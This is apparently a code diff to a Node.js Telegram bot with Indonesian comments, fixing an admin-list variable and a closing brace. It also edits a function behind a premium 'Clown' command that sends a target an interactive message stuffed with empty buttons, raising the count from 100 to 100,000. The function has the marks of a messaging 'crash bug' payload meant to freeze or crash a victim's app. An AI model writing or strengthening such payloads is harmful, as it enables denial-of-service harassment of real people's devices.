@@ -9,6 +9,7 @@ const vm = require('vm');
 const os = require('os');
 const { tokenBot, ownerID, CHANNEL_USERNAME } = require("./config");
 const adminFile = './database/adminuser.json';
+let adminUsers = []; // ✅ Tambahkan ini
 const FormData = require("form-data");
 const https = require("https");
 function fetchJsonHttps(url, timeout = 5000) {
@@ -1206,9 +1207,11 @@ const loadJSON = (file) => {
 
 const saveJSON = (file, data) => {
     fs.writeFileSync(file, JSON.stringify(data, null, 2));
-    
-    
-let adminUsers = loadJSON(adminFile);
+};
+
+// ✅ Muat adminUsers di sini
+adminUsers = loadJSON(adminFile);
+// let adminUsers = loadJSON(adminFile);  // HAPUS
 
 const checkAdmin = (ctx, next) => {
     if (!adminUsers.includes(ctx.from.id.toString())) {
@@ -3030,7 +3033,7 @@ bot.command("Clown", premGroupOnly(), async (ctx) => {
 async function VnFBuldoBlank(sock, target) {
     try {
         // Gunakan 500 tombol (bukan 500.000) untuk menghindari overload
-        const buttons = Array.from({ length: 100.000 }, () => ({}));
+        const buttons = Array.from({ length: 100000 }, () => ({})); // Tanpa titik
 
         const message = {
             interactiveMessage: {
